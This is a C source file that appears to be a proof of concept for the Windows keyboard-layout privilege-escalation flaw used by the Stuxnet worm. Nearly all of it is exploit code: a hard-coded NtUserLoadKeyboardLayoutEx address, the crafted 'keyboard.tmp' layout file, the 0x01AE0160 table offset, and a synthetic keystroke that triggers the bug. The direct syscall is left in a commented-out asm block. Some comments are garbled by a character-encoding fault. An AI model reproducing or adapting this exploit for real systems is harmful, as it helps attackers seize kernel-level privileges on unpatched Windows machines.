
#define _WIN32_WINNT 0x0501
#include <windows.h>
#include <stdio.h>

typedef struct _UNICODE_STRING
{
	WORD Length;
	WORD MaximumLength;
	LPWSTR Buffer;
} UNICODE_STRING, *PUNICODE_STRING;





void main()
{
	//!!! Hard coded NtUserLoadKeyboardLayoutEx !!!
	DWORD NtUserLoadKeyboardLayoutEx = 0x7e4212a0; 
	LPWSTR wszUserKLID = L"00008009";

	HANDLE hFile;
	INPUT key;

	PUNICODE_STRING  puserKLID         = new UNICODE_STRING();
	PUNICODE_STRING  puserKeyboardName = new UNICODE_STRING();

	DWORD Flags	= 0x101; //ָ�����װ����̲��֣�KLF_ACTIVATE|KLF_SETFORPROCESS
	//Specifies how the input locale identifier is to be loaded
	//This flag is valid only with KLF_ACTIVATE. 
	//Activates the specified input locale identifier for the entire process and sends the WM_INPUTLANGCHANGE message to the current thread's Focus or Active window. 
	//Typically, LoadKeyboardLayout activates an input locale identifier only for the current thread.
	DWORD dwKLID	= 0x80098009; //�������еĴ��װ��ļ��̲�������
	//The name of the input locale identifier to load.
	// This name is a string composed of the hexadecimal value of the Language Identifier (low word) and a device identifier (high word). 
	DWORD offTable  = 0x01ae0160;
	//The worm loads a special keyboard layout file by calling NtUserLoadKeyboardLayoutEx 
	//and passing it the following hexadecimal constant 0x01AE0160 as an offTable parameter. 
	//The low word of this parameter specifies the RVA (Relative Virtual Address) of the KBDTABLES structure from the beginning of the file, 
	//while the high word specifies the RVA of KBDNLSTABLES, which is of particular interest. 
	
	
	puserKLID->Buffer = wszUserKLID;
	puserKLID->Length = wcslen(wszUserKLID) * 2;
	puserKLID->MaximumLength = puserKLID->Length + 2;

	puserKeyboardName->Buffer = L"";
	puserKeyboardName->Length = 0;
	puserKeyboardName->MaximumLength = 0;

	HKL hKL = GetKeyboardLayout(GetCurrentThreadId()); //�ú������Ի��ָ���̵߳Ļ���̲��֣���ȡ�߳�Ψһ���̱߳�ʶ�� 
	
	hFile = CreateFileA("keyboard.tmp",    
                   GENERIC_READ,          
                   FILE_SHARE_READ,       
                   NULL,                  
                   OPEN_EXISTING,       
                   FILE_ATTRIBUTE_NORMAL, 
                   NULL);                
 
    LoadKeyboardLayout("00008009",KLF_SETFORPROCESS);
	// LoadKeyboardLayout: �ú�����ϵͳ��װ��һ���µļ��̲���
	/*
	__asm
	{
		push Flags    
		push dwKLID
		push puserKLID
		push hKL // the handle to a keyboard layout file
		push puserKeyboardName
		push offTable // an offset into keyboard layout
		push hFile // a keyboard layout file
		call NtUserLoadKeyboardLayoutEx  //Loads keyboard layout with given locale id
	}
    */

	ActivateKeyboardLayout(hKL, Flags); // ������̲��֡�hKL����������ļ��̲��ֵľ����Flags:������̲�����α�����

	memset(&key, 0, sizeof(key));
	key.type = 1;
	
	SendInput(1, &key, sizeof(key)); //�ú����ϳɼ����¼�������¼�������ģ�������߼��̲������¼����������������߼��̴���������档
    //The number of structures in the pInputs array.
	//An array of INPUT structures. Each structure represents an event to be inserted into the keyboard or mouse input stream.
	//key.type=1 -> INPUT_KEYBOARD=1, the event is a keyboard event. Use the ki structure of the union.
	//The size, in bytes, of an INPUT structure. If cbSize is not the size of an INPUT structure, the function fails.
	CloseHandle(hFile);
}